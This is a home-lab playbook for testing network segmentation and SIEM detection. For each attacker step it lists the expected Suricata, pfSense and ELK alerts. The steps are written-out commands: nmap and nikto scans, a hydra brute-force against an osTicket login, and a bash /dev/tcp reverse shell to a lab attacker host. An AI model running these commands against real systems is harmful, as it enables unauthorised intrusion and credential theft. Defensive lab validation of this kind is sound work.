# Attack Scenarios & Testing Playbook

This playbook provides attacker scenarios to validate segmentation, detection, monitoring, and SIEM integration across the lab.

---

## 1. Network Reconnaissance (Kali → DMZ)

bash
nmap -A 10.20.0.10
nmap -A 10.20.0.50
Expected:

Suricata “Nmap Scan Detected”

Apache access logs (for osTicket)

pfSense DMZ → Attacker allow logs

SIEM indexing suricata-* events

---

## 2. Attacker → LAN Enforcement Test
bash
Copy code
nmap -Pn 10.10.0.10
ping 10.10.0.10
Expected:

pfSense BLOCK logs

No LAN exposure to attacker

Suricata may show attempted SMB enumeration

---

## 3. Nikto Scan Against osTicket
bash
Copy code
nikto -h http://10.20.0.10
Expected:

Apache log spike

Suricata HTTP anomalies

ELK dashboards populate with web activity

---

## 4. Brute Force Attack on osTicket Login
bash
Copy code
hydra -l admin -P rockyou.txt 10.20.0.10 \
  http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"
Expected:

Suricata brute-force alert

Apache multiple failed POSTs

ELK counters increase

---

## 5. Reverse Shell Attempt (DMZ → Attacker)
Listener on Kali:

bash
Copy code
nc -nlvp 4444
Execute on compromised host:

bash
Copy code
bash -i >& /dev/tcp/10.30.0.10/4444 0>&1
Expected:

Suricata reverse-shell signature

pfSense logs DMZ → Attacker connection

Sysmon process creation on compromised Linux/Windows host

---

## 6. Vulnerability Scan (Scanner → DMZ + LAN)
Using Nessus or OpenVAS:

Scan 10.20.0.50

Scan 10.20.0.10

Optional: scan LAN domain assets

Expected:

Huge Suricata alert volume

Apache request spike

ELK indexes grow rapidly

---

## 7. Validation Checklist
 Suricata receives IDS data

 Beats forward logs to ELK

 pfSense syslogs visible

 Segmentation rules enforced

 Attack actions show up in Kibana
